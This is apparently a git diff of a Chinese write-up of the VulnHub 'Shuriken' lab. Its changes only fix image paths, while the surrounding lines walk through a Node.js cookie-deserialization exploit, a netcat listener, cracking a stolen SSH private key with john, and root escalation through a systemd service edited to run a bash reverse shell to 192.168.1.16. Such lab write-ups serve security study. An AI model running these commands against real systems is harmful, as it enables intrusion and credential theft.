@@ -8,19 +8,19 @@
 
 使用`arp-scan -l`或者`netdiscover -r 192.168.1.1/24`扫描
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\1.jpg)
+![](./pic-2/1.jpg)
 
 # 信息收集
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\2.jpg)
+![](./pic-2/2.jpg)
 
 ## 网站信息探测
 
 访问8080端口网站，可以看到是一个博客，查看页面源代码，确定为目录型网站
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\3.jpg)
+![](./pic-2/3.jpg)
 
 尝试进行网站目录扫描
 
@@ -32,25 +32,25 @@ gobuster dir -u http://192.168.1.127:8080 -w /usr/share/wordlists/dirb/big.txt -
 
 可以看到只扫描出四个，并且也并非是脚本语言
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\4.jpg)
+![](./pic-2/4.jpg)
 
 访问扫描出的目录
 
 发现在访问`/css`和`/img`时，都会提示无法使用`get`方式
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\5.jpg)
+![](./pic-2/5.jpg)
 
 访问`login`和`Login`时，都是同一个界面
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\6.jpg)
+![](./pic-2/6.jpg)
 
 使用`whatweb`进一步探测，不过也没有检测出什么
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\7.jpg)
+![](./pic-2/7.jpg)
 
 再次详细探测8080端口的默认界面，发现几个用户名，也就是文章发布者，并且发现两张图片
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\8.jpg)
+![](./pic-2/8.jpg)
 
 # 漏洞寻找
 
@@ -60,29 +60,29 @@ gobuster dir -u http://192.168.1.127:8080 -w /usr/share/wordlists/dirb/big.txt -
 
 使用`searchsploit`搜索有无该中间件的一些漏洞，因为这里是网站，所以根据搜索发现两个适合的，并且一个为`py`脚本，一个为`js`，并且都是序列化漏洞，可以远程代码执行的，下面还有一个文档，可以在上面漏洞无法使用时，查看
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\9.jpg)
+![](./pic-2/9.jpg)
 
 先测试`python`脚本是否可用，因为本人对于`python`代码相对比`js`代码好点，查看脚本代码，发现有需要修改的地方，也就是修改IP地址
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\10.jpg)
+![](./pic-2/10.jpg)
 
 不过测试发现并不能成功，那么查看文档，PDF文档详细记录了复现过程以及使用什么工具，那么可以按照文档中的内容进行复现，这里因为太长，所以截取关键图片
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\11.jpg)
+![](./pic-2/11.jpg)
 
 不过阅读文章发现，这里是通过修改`cookie`进行的漏洞，也就是`cookie`存在反序列化，那么查看原本的`cookie`
 
 发现为`eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D`，也就是`base64`编码后的，这里的`%3D`是`=`的`url`编码
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\11-1.jpg)
+![](./pic-2/11-1.jpg)
 
 解码后，发现是一串字符，类似于`json`格式，并且其中的`guest`正是在主页中的显示`welcome guest`
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\11-2.jpg)
+![](./pic-2/11-2.jpg)
 
 把其中的内容进行一个修改`username:superman`，然后编码后查看有无变化，可以看到`guest`变成`superman`
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\11-3.jpg)
+![](./pic-2/11-3.jpg)
 
 尝试把其中的参数再次修改，比如`admin`测试，发现还是无变化，再把`isguest`改为`false`，也无变化，说明还是需要按照文章来
 
@@ -92,7 +92,7 @@ gobuster dir -u http://192.168.1.127:8080 -w /usr/share/wordlists/dirb/big.txt -
 git clone https://github.com/ajinabraham/Node.Js-Security-Course.git
 ```
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\12.jpg)
+![](./pic-2/12.jpg)
 
 # 漏洞利用
 
@@ -102,7 +102,7 @@ git clone https://github.com/ajinabraham/Node.Js-Security-Course.git
 python2 nodejsshell.py 192.168.1.16 9999
 ```
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\13.jpg)
+![](./pic-2/13.jpg)
 
 然后根据文档中的步骤，添加一段代码，也就是加上，这里是模板，把上面的编码数据包裹起来，主要 就是 `()`，记得在使用时，在`burpsuit`中进行`base64`编码。
 
@@ -120,15 +120,15 @@ nc -lvnp 9999
 
 然后使用`burp`抓取数据包，修改`cookie:session=[上面构造的数据]`
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\14.jpg)
+![](./pic-2/14.jpg)
 
 或者在浏览器中更改`cookie`为上面的编码数据也行，然后刷新浏览器页面
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\15.jpg)
+![](./pic-2/15.jpg)
 
 这时候，可以在终端看到已经反弹成功
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\16.jpg)
+![](./pic-2/16.jpg)
 
 使用`dpkg -l | grep python`查看靶机安装哪些`python`版本，然后对应版本进行获取交互式界面
 
@@ -144,7 +144,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\17.jpg)
+![](./pic-2/17.jpg)
 
 使用`find`寻找`capabilites`文件，发现没有可利用的
 
@@ -152,7 +152,7 @@ find / -perm -u=s -type f 2>/dev/null
 find / -type f -executable 2>/dev/null | xargs getcap -r 2>/dev/null
 ```
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\18.jpg)
+![](./pic-2/18.jpg)
 
 收集系统内核、定时任务、用户数量等操作
 
@@ -163,7 +163,7 @@ cat /etc/passwd | grep /bin/bash
 ls /home
 ```
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\19.jpg)
+![](./pic-2/19.jpg)
 
 收集网络状态信息
 
@@ -172,7 +172,7 @@ ip addr
 ss -antlp
 ```
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\20.jpg)
+![](./pic-2/20.jpg)
 
 还有进程方面的信息，但是太多不好截图，就放命令
 
@@ -187,11 +187,11 @@ ps aux
 
 继续查看备份文件，一般在`/var/backups`中，这里发现一个压缩包，并且所属用户`serv-adm`的，不过具有查看权限
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\21.jpg)
+![](./pic-2/21.jpg)
 
 复制该压缩包到`/tmp`目录下，使用`unzip`进行解压，发现一个`id_rsa`文件，可能就是私钥文件
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\22.jpg)
+![](./pic-2/22.jpg)
 
 
 
@@ -201,11 +201,11 @@ ps aux
 
 在靶机使用`python`开启一个简易的`http`服务，然后在`kali`中下载`id_rsa`文件
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\23.jpg)
+![](./pic-2/23.jpg)
 
 尝试使用该文件进行`ssh`连接，发现需要密码，这个在之前的靶场中提到过，在生成`ssh`公私钥时，会进行一个设置，这里就是设置了私钥的密码
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\24.jpg)
+![](./pic-2/24.jpg)
 
 使用`john`套件转换后进行解密，发现密码为`shuriken1995@`
 
@@ -214,27 +214,27 @@ ssh2john id_rsa > hash
 john hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\25.jpg)
+![](./pic-2/25.jpg)
 
 再次使用这个密码进行`ssh`连接，登录成功
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\26.jpg)
+![](./pic-2/26.jpg)
 
 ## 垂直提权至root
 
 因为前面收集到`sudo`具有SUID权限，所以还是进行尝试，看是否需要密码，发现不需要，并且有三个文件
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\27.jpg)
+![](./pic-2/27.jpg)
 
 这个是启动某种服务，一般这种服务文件都放置在`/etc/systemd/system`，如果靶机有`locate`命令可用，可以直接使用该命令直接定位其位置。然后查看该服务文件的权限，发现虽然为可读权限，但是文件所属用户为当前登录的用户，所以可以更改其权限
 
 `vim`编辑器不可用，可以使用`vi`或者`nano`
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\28.jpg)
+![](./pic-2/28.jpg)
 
 编辑其文件，发现内容是没30分钟执行`shuriken-job.service`这个服务，先修改这个时间，改为1分钟
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\29.jpg)
+![](./pic-2/29.jpg)
 
 然后查看`shuriken-job.service`的权限以及内容，发现也是可以直接修改权限的，这里直接查看内容，发现有一个单元为启动时执行，表示启动该服务时会执行的操作，这里默认的是`/bin/df`，那么修改为其他脚本，比如这里在该文件中添加`bash`反弹命令
 
@@ -242,7 +242,7 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.16/1234 0>&1'
 ```
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\30.jpg)
+![](./pic-2/30.jpg)
 
 先在`kali`中开启监听，然后再执行上面的`sudo`命令，需要注意，这里的文件`shuriken-job.service`只有在启动`shuriken-auto.timer`时才行，并且是一次性的，所以如果出现问题，可以借助`sudo /bin/systemctl daemon-reload`重载，再启动即可
 
@@ -253,7 +253,7 @@ sudo /bin/systemctl daemon-reload
 sudo /bin/systemctl start shuriken-auto.timer
 ```
 
-![](D:\stu\vulnhub\shuriken靶场\pic-2\31.jpg)
+![](./pic-2/31.jpg)
 
 当然我这里只是选择了一种简单的方法，进行反弹，也有其他提权方法，放在文章后面的总结中
 
